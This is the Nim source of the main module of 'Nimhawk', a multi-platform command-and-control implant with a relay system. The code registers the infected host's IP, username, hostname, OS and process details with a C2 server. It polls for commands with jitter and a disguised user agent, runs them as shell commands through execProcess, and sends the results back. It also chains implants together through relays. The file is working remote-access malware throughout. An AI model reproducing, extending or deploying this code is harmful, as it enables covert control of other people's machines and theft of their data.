#[
    Nimhawk Multi-Platform Implant with Dynamic Relay System
    Simple polling-based relay system without threads
    by Alejandro Parodi (@hdbreaker_)
]#

import os, random, strutils, times, math, osproc, net, nativesockets, json, sequtils
import tables
import asyncdispatch, asyncnet, asynchttpserver, httpclient
import core/webClientListener
# Import persistence functions
from core/webClientListener import getStoredImplantID, storeImplantID
import config/configParser  
import util/[strenc, sysinfo]
import core/cmdParser
import core/relay/[relay_protocol, relay_comm, relay_config]
import modules/relay/relay_commands
# Import the global relay server from relay_commands to avoid conflicts
from modules/relay/relay_commands import g_relayServer
import std/[threadpool, locks]

# Import relay state from relay_commands module - NOW USING SAFE FUNCTIONS
export isRelayServer, relayServerPort, upstreamRelay, isConnectedToRelay

# Re-export system info functions for compatibility
export getLocalIP, getUsername, getSysHostname, getOSInfo, getCurrentPID, getCurrentProcessName

# ALL RELAY SERVER FUNCTIONS MOVED TO relay_commands.nim - USING SAFE PROTOCOL!

# Simple async communication queues (no locks needed in single-thread async)
type
    CommandTask* = object
        guid*: string
        command*: string
        args*: seq[string]
        targetClientId*: string
        timestamp*: int64
    
    CommandResult* = object
        guid*: string
        result*: string
        clientId*: string
        timestamp*: int64
    
    RelayRegistration* = object
        clientId*: string
        localIP*: string
        username*: string
        hostname*: string
        osInfo*: string
        pid*: int
        processName*: string
        timestamp*: int64

# Global async state (no locks needed)
var
    g_commandsFromC2*: seq[CommandTask] = @[]
    g_commandsToC2*: seq[CommandResult] = @[]
    g_relayRegistrations*: seq[RelayRegistration] = @[]
    # g_relayServer is now imported from relay_commands.nim to avoid conflicts
    
# Global relay client ID for consistent messaging
var g_relayClientID: string = ""

# Connect to upstream relay
proc connectToUpstreamRelay(host: string, port: int): string =
    when defined debug:
        echo "[DEBUG] Connecting to upstream relay: " & host & ":" & $port
    
    try:
        upstreamRelay = connectToRelay(host, port)
        if upstreamRelay.isConnected:
            when defined debug:
                echo "[DEBUG] Successfully connected to upstream relay"
            
            # Send registration with complete system info
            # CRITICAL: Check for existing ID first
            var implantID = getStoredImplantID()
            if implantID == "":
                # No stored ID - send registration request to get ID from C2
                implantID = "PENDING-REGISTRATION"
                when defined debug:
                    echo "[DEBUG] No stored ID - sending registration to get ID from C2"
            else:
                when defined debug:
                    echo "[DEBUG] Using stored relay client ID: " & implantID
            
            # Store the ID globally for consistent use
            g_relayClientID = implantID
            
            let route = @[implantID, "UPSTREAM"]
            
            # Collect system information for relay registration
            let localIP = getLocalIP()
            let username = getUsername()
            let hostname = getSysHostname()
            let osInfo = getOSInfo()
            let pid = getCurrentPID()
            let processName = getCurrentProcessName()
            
            # Create complete registration data as JSON
            let regData = %*{
                "implantID": implantID,
                "localIP": localIP,
                "username": username,
                "hostname": hostname,
                "osInfo": osInfo,
                "pid": pid,
                "processName": processName,
                "timestamp": epochTime().int64,
                "capabilities": ["relay", "client"],
                "mode": "relay_client"
            }
            
            let registerMsg = createMessage(REGISTER, implantID, route, $regData)
            
            if sendMessage(upstreamRelay, registerMsg):
                when defined debug:
                    echo "[DEBUG] Registered with upstream relay"
                return "Connected and registered with upstream relay: " & host & ":" & $port
            else:
                when defined debug:
                    echo "[DEBUG] Failed to register with upstream relay"
                return "Connected to upstream relay but failed to register: " & host & ":" & $port
        else:
            when defined debug:
                echo "[DEBUG] Failed to connect to upstream relay"
            return "Failed to connect to upstream relay: " & host & ":" & $port
    except Exception as e:
        return "Error connecting to upstream relay: " & e.msg

# processRelayCommand is now imported from modules/relay/relay_commands

# Async HTTP handler - Handles C2 communication
proc httpHandler() {.async.} =
    when defined debug:
        echo "[DEBUG] 🌐 Starting async HTTP handler"
    
    # Parse configuration
    let CONFIG: Table[string, string] = configParser.parseConfig()
    
    # Create listener object with configuration
    var listener = Listener()
    
    # Load configuration into listener
    listener.listenerType = CONFIG.getOrDefault("listenerType", "HTTP")
    listener.listenerHost = CONFIG.getOrDefault("hostname", "")
    listener.implantCallbackIp = CONFIG.getOrDefault("implantCallbackIp", "127.0.0.1")
    listener.listenerPort = CONFIG.getOrDefault("listenerPort", "80")
    listener.registerPath = CONFIG.getOrDefault("listenerRegPath", "/register")
    listener.taskPath = CONFIG.getOrDefault("listenerTaskPath", "/task")
    listener.resultPath = CONFIG.getOrDefault("listenerResPath", "/result")
    listener.reconnectPath = CONFIG.getOrDefault("reconnectPath", "/reconnect")
    listener.userAgent = CONFIG.getOrDefault("userAgent", "Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko")
    listener.httpAllowCommunicationKey = CONFIG.getOrDefault("httpAllowCommunicationKey", "DefaultKey123")
    listener.sleepTime = parseInt(CONFIG.getOrDefault("sleepTime", "10"))
    listener.sleepJitter = parseFloat(CONFIG.getOrDefault("sleepJitter", "0"))
    listener.killDate = CONFIG.getOrDefault("killDate", "")
    
    # Initialize HTTP listener
    webClientListener.init(listener)
    
    # Register this implant with C2
    let localIP = getLocalIP()
    let username = getUsername()
    let hostname = getSysHostname()
    let osInfo = getOSInfo()
    let pid = getCurrentPID()
    let processName = getCurrentProcessName()
    
    webClientListener.postRegisterRequest(listener, localIP, username, hostname, 
                                         osInfo, pid, processName, false)
    
    when defined debug:
        echo "[DEBUG] 🌐 HTTP Handler: Implant registered with C2"
        echo "[DEBUG] 🌐 HTTP Handler: Starting polling loop with " & $listener.sleepTime & "s interval"
    
    # MAIN POLLING LOOP - This is what was missing!
    while true:
        try:
            when defined debug:
                echo "[DEBUG] 🌐 HTTP Handler: Starting polling cycle"
            
            # 1. Handle relay registrations - forward to C2
            for registration in g_relayRegistrations:
                when defined debug:
                    echo "[DEBUG] 🌐 HTTP Handler: Forwarding relay registration to C2: " & registration.clientId
                
                discard webClientListener.postRelayRegisterRequest(listener, registration.clientId, 
                                                          registration.localIP, registration.username, 
                                                          registration.hostname, registration.osInfo, 
                                                          registration.pid, registration.processName, true)
                
                when defined debug:
                    echo "[DEBUG] 🌐 HTTP Handler: ✅ Relay registration forwarded to C2"
            
            g_relayRegistrations = @[]  # Clear processed registrations
            
            # 1.5. CRITICAL: Poll relay server for messages (if running)
            when defined debug:
                echo "[DEBUG] 🌐 HTTP Handler: Checking relay server status - isListening: " & $g_relayServer.isListening
                echo "[DEBUG] 🌐 HTTP Handler: Relay server port: " & $g_relayServer.port
                let stats = getConnectionStats(g_relayServer)
                echo "[DEBUG] 🌐 HTTP Handler: Relay server connections: " & $stats.connections
            
            if g_relayServer.isListening:
                when defined debug:
                    echo "[DEBUG] 🌐 HTTP Handler: Polling relay server for messages"
                
                try:
                    let messages = pollRelayServerMessages()  # Use function from relay_commands.nim
                    
                    when defined debug:
                        echo "[DEBUG] 🌐 HTTP Handler: Relay server returned " & $messages.len & " messages"
                    
                    for msg in messages:
                        when defined debug:
                            echo "[DEBUG] 🌐 HTTP Handler: Received relay message type: " & $msg.msgType
                        
                        case msg.msgType:
                        of REGISTER:
                            when defined debug:
                                echo "[DEBUG] 🌐 HTTP Handler: Processing relay client registration"
                            
                            # Decrypt and parse registration data
                            let decryptedPayload = decryptPayload(msg.payload, msg.fromID)
                            
                            when defined debug:
                                echo "[DEBUG] 🌐 HTTP Handler: Decrypted registration: " & decryptedPayload
                            
                            try:
                                let regData = parseJson(decryptedPayload)
                                let registration = RelayRegistration(
                                    clientId: regData["implantID"].getStr(),
                                    localIP: regData["localIP"].getStr(),
                                    username: regData["username"].getStr(),
                                    hostname: regData["hostname"].getStr(),
                                    osInfo: regData["osInfo"].getStr(),
                                    pid: regData["pid"].getInt(),
                                    processName: regData["processName"].getStr(),
                                    timestamp: epochTime().int64
                                )
                                
                                # Forward registration to C2 and get assigned ID
                                let assignedId = webClientListener.postRelayRegisterRequest(listener, registration.clientId, 
                                                                          registration.localIP, registration.username, 
                                                                          registration.hostname, registration.osInfo, 
                                                                          registration.pid, registration.processName, true)
                                
                                when defined debug:
                                    echo "[DEBUG] 🌐 HTTP Handler: ✅ Relay registration forwarded to C2"
                                    echo "[DEBUG] 🌐 HTTP Handler: Original ID: " & registration.clientId
                                    echo "[DEBUG] 🌐 HTTP Handler: Assigned ID: " & assignedId
                                
                                # Send assigned ID back to relay client
                                if assignedId != "":
                                    let idMsg = createMessage(HTTP_RESPONSE,
                                        generateImplantID("RELAY-SERVER"),
                                        @[registration.clientId, "RELAY-SERVER"],
                                        assignedId
                                    )
                                    
                                    let stats = getConnectionStats(g_relayServer)
                                    if stats.connections > 0:
                                        discard broadcastMessage(g_relayServer, idMsg)
                                        when defined debug:
                                            echo "[DEBUG] 🌐 HTTP Handler: ✅ ID assignment sent to relay client: " & assignedId
                                    else:
                                        when defined debug:
                                            echo "[DEBUG] 🌐 HTTP Handler: ⚠️  No relay connections to send ID to"
                                else:
                                    when defined debug:
                                        echo "[DEBUG] 🌐 HTTP Handler: ❌ No ID assigned by C2"
                                
                            except Exception as e:
                                when defined debug:
                                    echo "[DEBUG] 🌐 HTTP Handler: ❌ Error parsing relay registration: " & e.msg
                        
                        of PULL:
                            when defined debug:
                                echo "[DEBUG] 🌐 HTTP Handler: Relay client requesting commands (PULL = check-in)"
                            
                            # CRITICAL: Relay client PULL = check-in to C2
                            # We need to do a check-in to C2 on behalf of the relay client
                            when defined debug:
                                echo "[DEBUG] 💓 HTTP Handler: Performing check-in to C2 on behalf of relay client: " & msg.fromID
                            
                            # Temporarily change listener ID to relay client ID for check-in
                            let originalId = listener.id
                            listener.id = msg.fromID
                            
                            # Perform check-in to C2 for relay client
                            let (cmdGuid, cmd, args) = webClientListener.getQueuedCommand(listener)
                            
                            # Restore original listener ID
                            listener.id = originalId
                            
                            when defined debug:
                                if cmd != "":
                                    echo "[DEBUG] 💓 HTTP Handler: Got command from C2 for relay client " & msg.fromID & ": " & cmd
                                else:
                                    echo "[DEBUG] 💓 HTTP Handler: No commands from C2 for relay client " & msg.fromID & " (check-in successful)"
                            
                            # CRITICAL: Don't forward connection errors as commands!
                            if cmd != "" and cmd != obf("NIMPLANT_CONNECTION_ERROR"):
                                when defined debug:
                                    echo "[DEBUG] 🌐 HTTP Handler: Sending command to relay client: " & cmd
                                
                                # Create command message
                                let cmdMsg = createMessage(COMMAND,
                                    generateImplantID("RELAY-SERVER"),
                                    msg.route,
                                    cmd
                                )
                                
                                # Send command to relay client
                                let stats = getConnectionStats(g_relayServer)
                                if stats.connections > 0:
                                    discard broadcastMessage(g_relayServer, cmdMsg)
                                    when defined debug:
                                        echo "[DEBUG] 🌐 HTTP Handler: ✅ Command sent to " & $stats.connections & " relay clients"
                            elif cmd == obf("NIMPLANT_CONNECTION_ERROR"):
                                when defined debug:
                                    echo "[DEBUG] 🌐 HTTP Handler: ⚠️  C2 connection error for relay client " & msg.fromID & " - not forwarding as command"
                        
                        of RESPONSE:
                            when defined debug:
                                echo "[DEBUG] 🌐 HTTP Handler: Received command result from relay client"
                            
                            # Decrypt response
                            let decryptedResponse = decryptPayload(msg.payload, msg.fromID)
                            
                            when defined debug:
                                echo "[DEBUG] 🌐 HTTP Handler: Relay result: " & 
                                     (if decryptedResponse.len > 100: decryptedResponse[0..99] & "..." else: decryptedResponse)
                            
                            # Send result to C2 and get confirmation
                            when defined debug:
                                echo "[DEBUG] 🌐 HTTP Handler: Sending relay result to C2..."
                            
                            # Temporarily change listener ID to relay client ID for result submission
                            let originalId = listener.id
                            listener.id = msg.fromID
                            
                            # Send result to C2
                            webClientListener.postCommandResults(listener, "", decryptedResponse)
                            
                            # Restore original listener ID
                            listener.id = originalId
                            
                            when defined debug:
                                echo "[DEBUG] 🌐 HTTP Handler: ✅ Relay result sent to C2"
                            
                            # Send confirmation back to relay client
                            let confirmMsg = createMessage(HTTP_RESPONSE,
                                generateImplantID("RELAY-SERVER"),
                                msg.route,
                                "RESULT_SENT_TO_C2"
                            )
                            
                            let stats = getConnectionStats(g_relayServer)
                            if stats.connections > 0:
                                discard broadcastMessage(g_relayServer, confirmMsg)
                                when defined debug:
                                    echo "[DEBUG] 🌐 HTTP Handler: ✅ Confirmation sent to relay client"
                        
                        else:
                            when defined debug:
                                echo "[DEBUG] 🌐 HTTP Handler: ℹ️  Ignoring relay message type: " & $msg.msgType
                
                except Exception as e:
                    when defined debug:
                        echo "[DEBUG] 🌐 HTTP Handler: Error polling relay server: " & e.msg
            
            # 2. Handle command results - send to C2
            for result in g_commandsToC2:
                when defined debug:
                    echo "[DEBUG] 🌐 HTTP Handler: Sending result to C2 (first 100 chars): " & 
                         (if result.result.len > 100: result.result[0..99] & "..." else: result.result)
                
                webClientListener.postCommandResults(listener, result.guid, result.result)
                
                when defined debug:
                    echo "[DEBUG] 🌐 HTTP Handler: ✅ Result sent to C2"
            
            g_commandsToC2 = @[]  # Clear processed results
            
            # 3. CRITICAL: Poll C2 for commands (this does the check-in!)
            when defined debug:
                echo "[DEBUG] 🌐 HTTP Handler: Polling C2 for commands (check-in)"
            
            let (cmdGuid, cmd, args) = webClientListener.getQueuedCommand(listener)
            
            when defined debug:
                if cmd != "":
                    echo "[DEBUG] 🌐 HTTP Handler: Got command from C2: " & cmd
                else:
                    echo "[DEBUG] 🌐 HTTP Handler: No commands from C2 (check-in successful)"
            
            if cmd != "":
                # Process ALL commands locally (this is a normal implant!)
                when defined debug:
                    echo "[DEBUG] 🌐 HTTP Handler: Processing command locally: " & cmd
                
                let result = cmdParser.parseCmd(listener, cmd, cmdGuid, args)
                webClientListener.postCommandResults(listener, cmdGuid, result)
                
                when defined debug:
                    echo "[DEBUG] 🌐 HTTP Handler: ✅ Command executed and result sent to C2"
                    echo "[DEBUG] 🌐 HTTP Handler: Result (first 200 chars): " & 
                         (if result.len > 200: result[0..199] & "..." else: result)
            
            # 4. Sleep with jitter (like normal implant)
            let sleepMs = listener.sleepTime * 1000
            let jitterMs = if listener.sleepJitter > 0:
                int(float(sleepMs) * (listener.sleepJitter / 100.0) * rand(1.0))
            else:
                0
            
            let totalSleepMs = sleepMs + jitterMs
            
            when defined debug:
                echo "[DEBUG] 🌐 HTTP Handler: Sleeping for " & $totalSleepMs & "ms (base: " & 
                     $sleepMs & "ms, jitter: " & $jitterMs & "ms)"
            
            await sleepAsync(totalSleepMs)
            
            when defined debug:
                echo "[DEBUG] 🌐 HTTP Handler: Woke up from sleep, continuing loop"
            
        except Exception as e:
            when defined debug:
                echo "[DEBUG] 🌐 HTTP Handler error: " & e.msg
                echo "[DEBUG] 🌐 HTTP Handler: Exception details: " & e.getStackTrace()
            await sleepAsync(5000)

# Async relay client handler
proc relayClientHandler(host: string, port: int) {.async.} =
    when defined debug:
        echo "[DEBUG] 🔗 Starting async relay client handler"
        echo "[DEBUG] 🔗 Relay Client Handler: Host=" & host & ", Port=" & $port
        echo "[DEBUG] 🔗 Relay Client Handler: upstreamRelay.isConnected=" & $upstreamRelay.isConnected
    
    var loopCount = 0
    while true:
        try:
            loopCount += 1
            when defined debug:
                echo "[DEBUG] 🔗 Relay Client: Loop #" & $loopCount & " - Polling upstream relay for messages..."
                echo "[DEBUG] 🔗 Relay Client: Connection status: " & $upstreamRelay.isConnected
            
            let messages = pollUpstreamRelayMessages()  # Uses safe polling with timeout
            
            when defined debug:
                if messages.len > 0:
                    echo "[DEBUG] 🔗 ═══════════════════════════════════════════════════════════════"
                    echo "[DEBUG] 🔗 RELAY CLIENT: Received " & $messages.len & " messages from relay server"
                    echo "[DEBUG] 🔗 ═══════════════════════════════════════════════════════════════"
                else:
                    echo "[DEBUG] 🔗 Relay Client: No messages from relay server (polling...)"
            
            for msg in messages:
                when defined debug:
                    echo "[DEBUG] 📨 ┌─────────── RELAY CLIENT MESSAGE ───────────┐"
                    echo "[DEBUG] 📨 │ Type:    " & $msg.msgType & "              │"
                    echo "[DEBUG] 📨 │ From:    " & msg.fromID & "                │"
                    echo "[DEBUG] 📨 │ Route:   " & $msg.route & "                │"
                    echo "[DEBUG] 📨 │ Payload: " & $msg.payload.len & " bytes    │"
                    echo "[DEBUG] 📨 └────────────────────────────────────────────┘"
                
                case msg.msgType:
                of COMMAND:
                    # Execute command and send result back via relay
                    let decryptedPayload = decryptPayload(msg.payload, msg.fromID)
                    
                    when defined debug:
                        echo "[DEBUG] 🎯 ┌─────────── COMMAND FROM C2 VIA RELAY ──────────────────────┐"
                        echo "[DEBUG] 🎯 │ ✅ COMMAND RECEIVED FROM C2 (via relay server)             │"
                        echo "[DEBUG] 🎯 │    Command from ID: " & msg.fromID & "                    │"
                        echo "[DEBUG] 🎯 │    Route: " & $msg.route & "                                  │"
                        echo "[DEBUG] 🎯 │    Encrypted payload: " & $msg.payload.len & " bytes │"
                        echo "[DEBUG] 🎯 └─────────────────────────────────────────────────────────┘"
                    
                    when defined debug:
                        echo "[DEBUG] 🔓 ┌─────────── DECRYPTED COMMAND ───────────┐"
                        echo "[DEBUG] 🔓 │ Command: " & decryptedPayload & " │"
                        echo "[DEBUG] 🔓 └─────────────────────────────────────────┘"
                        echo "[DEBUG] ⚡ Executing command..."
                    
                    # For relay clients, we need to handle commands differently
                    # since we don't have an HTTP listener
                    var result: string
                    if decryptedPayload.startsWith("relay "):
                        result = processRelayCommand(decryptedPayload)
                        when defined debug:
                            echo "[DEBUG] 🔧 Relay command executed"
                    else:
                        # Execute system commands directly
                        try:
                            result = execProcess(decryptedPayload)
                            when defined debug:
                                echo "[DEBUG] 💻 ┌─────────── COMMAND RESULT ───────────┐"
                                echo "[DEBUG] 💻 │ ✅ System command executed successfully │"
                                echo "[DEBUG] 💻 │ Result length: " & $result.len & " bytes │"
                                echo "[DEBUG] 💻 │ Result (first 200 chars): │"
                                echo "[DEBUG] 💻 │ " & (if result.len > 200: result[0..199] & "..." else: result) & " │"
                                echo "[DEBUG] 💻 └─────────────────────────────────────┘"
                        except Exception as e:
                            result = "Error executing command: " & e.msg
                            when defined debug:
                                echo "[DEBUG] ❌ ┌─────────── COMMAND ERROR ───────────┐"
                                echo "[DEBUG] ❌ │ Command execution failed │"
                                echo "[DEBUG] ❌ │ Error: " & e.msg & " │"
                                echo "[DEBUG] ❌ └─────────────────────────────────────┘"
                    
                    when defined debug:
                        echo "[DEBUG] 📤 ┌─────────── SENDING RESULT TO RELAY ───────────┐"
                        echo "[DEBUG] 📤 │ Sending result back to relay server... │"
                        echo "[DEBUG] 📤 │ From ID: " & g_relayClientID & " │"
                        echo "[DEBUG] 📤 │ Route: " & $msg.route & " │"
                        echo "[DEBUG] 📤 │ Result size: " & $result.len & " bytes │"
                        echo "[DEBUG] 📤 └─────────────────────────────────────────────┘"
                    
                    let resultMsg = createMessage(RESPONSE,
                        g_relayClientID,
                        msg.route,
                        result
                    )
                    
                    if sendMessage(upstreamRelay, resultMsg):
                        when defined debug:
                            echo "[DEBUG] ✅ ┌─────────── RESULT SENT ───────────┐"
                            echo "[DEBUG] ✅ │ Result sent back to relay server │"
                            echo "[DEBUG] ✅ │ Waiting for C2 confirmation... │"
                            echo "[DEBUG] ✅ └─────────────────────────────────┘"
                    else:
                        when defined debug:
                            echo "[DEBUG] ❌ ┌─────────── SEND FAILED ───────────┐"
                            echo "[DEBUG] ❌ │ Failed to send result to relay │"
                            echo "[DEBUG] ❌ └─────────────────────────────────┘"
                
                of HTTP_RESPONSE:
                    # This could be ID assignment or command result confirmation
                    let responsePayload = decryptPayload(msg.payload, msg.fromID)
                    
                    when defined debug:
                        echo "[DEBUG] 🔄 ┌─────────── HTTP RESPONSE FROM RELAY ───────────┐"
                        echo "[DEBUG] 🔄 │ ✅ HTTP RESPONSE FROM RELAY SERVER │"
                        echo "[DEBUG] 🔄 │ Response: " & responsePayload & " │"
                        echo "[DEBUG] 🔍 │ BROADCAST FILTER: Message fromID: '" & msg.fromID & "' │"
                        echo "[DEBUG] 🔍 │ BROADCAST FILTER: My client ID: '" & g_relayClientID & "' │"
                        echo "[DEBUG] 🔍 │ BROADCAST FILTER: Message route: " & $msg.route & " │"
                        echo "[DEBUG] 🔄 └─────────────────────────────────────────────────┘"
                    
                    if responsePayload == "RESULT_SENT_TO_C2":
                        when defined debug:
                            echo "[DEBUG] 🎉 ┌─────────── C2 CONFIRMATION ───────────┐"
                            echo "[DEBUG] 🎉 │ ✅ Command result successfully sent to C2 │"
                            echo "[DEBUG] 🎉 │ End-to-end command flow completed! │"
                            echo "[DEBUG] 🎉 └─────────────────────────────────────────┘"
                    elif responsePayload != "" and responsePayload != "PENDING-REGISTRATION" and not responsePayload.startsWith("RESULT_"):
                        # This is likely an ID assignment - WITH VALIDATION
                        when defined debug:
                            echo "[DEBUG] 🔍 SIMPLE ID ASSIGNMENT: responsePayload = '" & responsePayload & "'"
                            echo "[DEBUG] 🔍 SIMPLE ID ASSIGNMENT: Current g_relayClientID = '" & g_relayClientID & "'"
                        
                        # CRITICAL FIX: Apply validation for simple ID assignment
                        if g_relayClientID != "" and g_relayClientID != "PENDING-REGISTRATION" and g_relayClientID != responsePayload:
                            when defined debug:
                                echo "[DEBUG] 🚨 SIMPLE ID CONTAMINATION DETECTED!"
                                echo "[DEBUG] 🚨 This client ID: '" & g_relayClientID & "'"
                                echo "[DEBUG] 🚨 Response for ID: '" & responsePayload & "'"
                                echo "[DEBUG] 🚨 IGNORING simple ID response meant for another client!"
                            # IGNORE responses not meant for this client
                            continue
                        
                        g_relayClientID = responsePayload
                        storeImplantID(responsePayload)
                        when defined debug:
                            echo "[DEBUG] 🆔 ┌─────────── ID ASSIGNMENT ───────────┐"
                            echo "[DEBUG] 🆔 │ ✅ ID assigned by C2 and stored │"
                            echo "[DEBUG] 🆔 │ New ID: " & responsePayload & " │"
                            echo "[DEBUG] 🆔 └─────────────────────────────────────┘"
                    else:
                        when defined debug:
                            echo "[DEBUG] ℹ️  ┌─────────── OTHER RESPONSE ───────────┐"
                            echo "[DEBUG] ℹ️  │ Other HTTP response: " & responsePayload & " │"
                            echo "[DEBUG] ℹ️  └─────────────────────────────────────────┘"
                
                of FORWARD:
                    # Forwarded message from another implant
                    when defined debug:
                        echo "[DEBUG] 🔗 Relay Client: Received forwarded message"
                
                else:
                    when defined debug:
                        echo "[DEBUG] 🔗 Relay Client: ℹ️  Ignoring message type: " & $msg.msgType
            
            # Send PULL message to request commands from relay server
            when defined debug:
                echo "[DEBUG] 📡 ┌─────────── SENDING PULL REQUEST ───────────┐"
                echo "[DEBUG] 📡 │ Sending PULL request for commands... │"
                echo "[DEBUG] 📡 │ Client ID: " & g_relayClientID & " │"
                echo "[DEBUG] 📡 │ Route: [" & g_relayClientID & ", RELAY-SERVER] │"
                echo "[DEBUG] 📡 └─────────────────────────────────────────────┘"
            
            let pullMsg = createMessage(PULL,
                g_relayClientID,
                @[g_relayClientID, "RELAY-SERVER"],
                "poll_commands"
            )
            
            if sendMessage(upstreamRelay, pullMsg):
                when defined debug:
                    echo "[DEBUG] ✅ ┌─────────── PULL SENT ───────────┐"
                    echo "[DEBUG] ✅ │ PULL request sent successfully │"
                    echo "[DEBUG] ✅ │ Waiting for relay server... │"
                    echo "[DEBUG] ✅ └─────────────────────────────────┘"
            else:
                when defined debug:
                    echo "[DEBUG] ❌ ┌─────────── PULL FAILED ───────────┐"
                    echo "[DEBUG] ❌ │ Failed to send PULL request │"
                    echo "[DEBUG] ❌ │ Connection may be lost │"
                    echo "[DEBUG] ❌ └─────────────────────────────────┘"
            
            await sleepAsync(5000) # 5 second sleep for relay clients
            
            # Check if connection is still alive
            if not upstreamRelay.isConnected:
                when defined debug:
                    echo "[DEBUG] Connection lost, attempting to reconnect..."
                await sleepAsync(10000) # Wait before reconnecting
                let reconnectResult = connectToUpstreamRelay(host, port)
                when defined debug:
                    echo "[DEBUG] Reconnection result: " & reconnectResult
                    
        except Exception as e:
            when defined debug:
                echo "[DEBUG] Relay client error: " & e.msg
            await sleepAsync(5000)

# Main execution function
proc runMultiImplant*() =
    echo "=== Nimhawk Multi-Platform v1.5.0 - Dynamic Relay System ==="
    
    when defined debug:
        echo "[DEBUG] Debug mode enabled"
        echo "[DEBUG] PID: " & $getCurrentPID()
        echo "[DEBUG] Process: " & getCurrentProcessName()
        echo "[DEBUG] OS: " & getOSInfo()
        echo "[DEBUG] User: " & getUsername()
        echo "[DEBUG] Hostname: " & getSysHostname()
        echo "[DEBUG] Local IP: " & getLocalIP()
        echo "[DEBUG] Available relay commands:"
        echo "[DEBUG]   relay port 9999          - Start relay server on port 9999"
        echo "[DEBUG]   relay connect relay://ip:port - Connect to upstream relay"
        echo "[DEBUG]   relay status             - Show relay status"
        echo "[DEBUG]   relay stop               - Stop relay server"
        echo "[DEBUG]   relay disconnect         - Disconnect from upstream"
        echo ""
    
    # Check if compiled as relay client
    when defined(RELAY_MODE):
        const RELAY_ADDR {.strdefine.}: string = ""
        
        when defined debug:
            echo "[DEBUG] RELAY MODE - Compiled as relay client"
            echo "[DEBUG] Target relay address: " & RELAY_ADDR
        
        if RELAY_ADDR != "":
            # Parse relay address - strip quotes if present
            let cleanRelayAddr = RELAY_ADDR.strip(chars = {'"'})
            when defined debug:
                echo "[DEBUG] Cleaned relay address: " & cleanRelayAddr
            
            if cleanRelayAddr.startsWith("relay://"):
                let urlParts = cleanRelayAddr[8..^1].split(":")
                if urlParts.len == 2:
                    try:
                        let host = urlParts[0]
                        let port = parseInt(urlParts[1])
                        
                        when defined debug:
                            echo "[DEBUG] Connecting to relay server: " & host & ":" & $port
                        
                        # Connect to upstream relay
                        let result = connectToUpstreamRelay(host, port)
                        
                        when defined debug:
                            echo "[DEBUG] Relay connection result: " & result
                        
                        if upstreamRelay.isConnected:
                            when defined debug:
                                echo "[DEBUG] ✅ Successfully connected to relay. Entering relay client mode."
                                echo "[DEBUG] 🔗 RELAY CLIENT MODE ACTIVATED"
                                echo "[DEBUG] 📡 Listening for commands from relay server..."
                            
                            # Relay client main loop - only handle relay messages using SAFE FUNCTIONS
                            asyncCheck relayClientHandler(host, port)
                            
                            # Run the async event loop
                            runForever()
                        else:
                            when defined debug:
                                echo "[DEBUG] Failed to connect to relay. Exiting."
                            return
                    except:
                        when defined debug:
                            echo "[DEBUG] Invalid relay address format"
                        return
                else:
                    when defined debug:
                        echo "[DEBUG] Invalid relay URL format"
                    return
            else:
                when defined debug:
                    echo "[DEBUG] Invalid relay URL format"
                return
        else:
            when defined debug:
                echo "[DEBUG] No relay address specified"
            return
    else:
        # Start HTTP handler only - relay server starts on demand via commands
        when defined debug:
            echo "[DEBUG] 🚀 Starting HTTP Handler (relay server on-demand only)"
        
        when defined debug:
            echo "[DEBUG] ✅ Starting async event loop"
            echo "[DEBUG] 🚀 Starting HTTP Handler..."
            echo "[DEBUG] ℹ️  Relay server will start when 'relay port' command is executed"
        
        # Start only HTTP handler - relay server starts via command
        asyncCheck httpHandler()
        
        when defined debug:
            echo "[DEBUG] ✅ HTTP handler started"
            echo "[DEBUG] 🔄 Running async event loop..."
        
        # Run the async event loop forever
        runForever()

# Entry point
when isMainModule:
    when defined debug:
        echo "=== Nimhawk Multi-Platform v1.5.0 - Dynamic Relay System ==="
        echo "[DEBUG] Debug mode enabled"
        echo "[DEBUG] PID: " & $getCurrentProcessId()
        echo "[DEBUG] Process: " & getAppFilename().extractFilename()
        echo "[DEBUG] OS: " & hostOS & " " & hostCPU
        echo "[DEBUG] User: " & getEnv("USER", "unknown")
        echo "[DEBUG] Hostname: " & getEnv("HOSTNAME", getEnv("COMPUTERNAME", "unknown"))
        echo "[DEBUG] Local IP: " & getLocalIP()
        echo "[DEBUG] Available relay commands:"
        echo "[DEBUG]   relay port 9999          - Start relay server on port 9999"
        echo "[DEBUG]   relay connect relay://ip:port - Connect to upstream relay"
        echo "[DEBUG]   relay status             - Show relay status"
        echo "[DEBUG]   relay stop               - Stop relay server"
        echo "[DEBUG]   relay disconnect         - Disconnect from upstream"
        echo ""
    
    randomize()
    runMultiImplant() 